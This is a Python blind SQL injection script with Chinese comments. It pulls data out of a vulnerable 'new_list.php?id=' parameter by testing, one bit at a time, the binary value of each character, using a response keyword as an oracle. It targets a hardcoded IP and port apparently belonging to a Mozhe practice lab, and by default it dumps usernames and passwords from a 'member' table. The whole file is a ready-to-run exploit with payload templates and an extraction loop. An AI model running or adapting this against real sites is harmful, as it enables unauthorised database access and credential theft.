import requests

################################################################################
# Author:F1tz                                                                  #
# Desc:                  通过比对二进制值来查询内容                              #
#        尽量不要查询太长的数据内容，以免因为网络延迟导致出错                      #
#                                                                              #
#  比如查询 (select group_concat(name,0x7e,password) from member)               #
#           可以分为两次查询                                                    #
#    (select group_concat(name) from member)                                   #
#    (select group_concat(password) from member)                               #
# 盲注测试地址：                                                                #
# https://www.mozhe.cn/bug/detail/UDNpU0gwcUhXTUFvQm9HRVdOTmNTdz09bW96aGUmozhe #
################################################################################

KEYWORD = '停机维护'  # 搜寻成功的关键字
BASEURL = 'http://219.153.49.228:46784/new_list.php?id=1'  # 盲注注入点

payloads = {
    'len': '%26(length(bin(length({0})))={1})%23',  # 查长度二进制长度 {0}=查询内容 如 database() {1} =总长度
    'lennum': '%26(substr(bin(length({0})),{1},1))%23',  # 转换二进制到十进制 {0}=查询内容 {1} =总长度
    'binlen': '%26(length(bin(ascii((substr({0},{1},1)))))=7)%23',  # {0}查询内容 {1}为查询的位数 长度不等于7就等于6
    'content': '%26(substr(bin(ascii((substr({0},{1},1)))),{2},1))%23'  # {0}查询内容，{1}最大长度7或者6
}


def getlen(field):
    print('[*]正在查询 {} 长度...'.format(field))
    for i in range(8, 0,-1):
        try:
            r = requests.get(BASEURL + payloads['len'].format(field, i), allow_redirects=False)
            if r.status_code == requests.codes.ok:
                if KEYWORD in r.text:
                    l = getlennum(field, i)
                    print('  [+]测出长度为：{}'.format(l))
                    return l
        except Exception as e:
            print(e)
            pass


def getlennum(field,num):
    binstr = ''
    for i in range(1, num + 1):
        try:
            r = requests.get(BASEURL + payloads['lennum'].format(field, i), allow_redirects=False)
            if r.status_code == requests.codes.ok:
                if KEYWORD in r.text:
                    binstr += '1'
                    continue
                else:
                    binstr += '0'
                    continue
        except Exception as e:
            print(e)
            pass
    string = int(binstr, 2)
    return string


def getbinlen(field, num):
    try:
        r = requests.get(BASEURL + payloads['binlen'].format(field, num), allow_redirects=False)
        if r.status_code == requests.codes.ok:
            if KEYWORD in r.text:
                return 7
            else:
                return 6
        else:
            return 0
    except Exception as e:
        print(e)
        pass


def getbindata(field):
    clen = getlen(field)
    binstr = ''
    string = ''
    print('[*]正在查询内容...')
    for i in range(1, clen + 1):
        tmpnum = getbinlen(field, i)
        for j in range(1, tmpnum + 1):
            try:
                r = requests.get(BASEURL + payloads['content'].format(field, i, j), allow_redirects=False)
                if (r.status_code == requests.codes.ok):
                    if (KEYWORD in r.text):
                        binstr += '1'
                        continue
                    else:
                        binstr += '0'
                        continue
            except Exception as e:
                print(e)
                pass

        string += chr(int(binstr, 2))
        print('  [+]查询{0}内容为：{1}'.format(field, string))
        binstr = ''


if __name__ == '__main__':
    getbindata('(select group_concat(name,0x7e,password) from member)')
